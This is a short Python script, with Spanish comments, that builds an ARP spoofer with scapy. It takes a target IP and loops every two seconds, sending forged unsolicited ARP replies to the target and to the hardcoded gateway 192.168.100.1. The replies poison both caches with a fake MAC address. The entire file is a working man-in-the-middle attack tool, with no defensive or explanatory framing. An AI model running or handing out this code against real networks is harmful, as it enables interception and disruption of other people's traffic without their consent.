#!/usr/bin/env python3 

import argparse
import time
import scapy.all as scapy
import signal
from termcolor import colored
import os


def senial(sig, fram):

    print(colored("Saliendo...", "grey"))
    os._exit(1)


signal.signal(signal.SIGINT, senial)

def getArguments():
    arg = argparse.ArgumentParser(description="ARP Spoofer")
    arg.add_argument("-t", "--target", required=True, dest="ipAddr", help="Host/Ip Range to spoof")

    return arg.parse_args()

def spoof(ip, spoof_ip):
    
    arp_pack = scapy.ARP(op=2, psrc=spoof_ip, pdst=ip, hwsrc="aa:11:22:33:44:55") # op=2 es una respuesta que nadie ha solicitado
    scapy.send(arp_pack, verbose=False)


def main():
    args = getArguments()

    while True:
        spoof(args.ipAddr, "192.168.100.1")
        spoof("192.168.100.1", args.ipAddr)
        time.sleep(2)

if __name__ == '__main__':
    main()
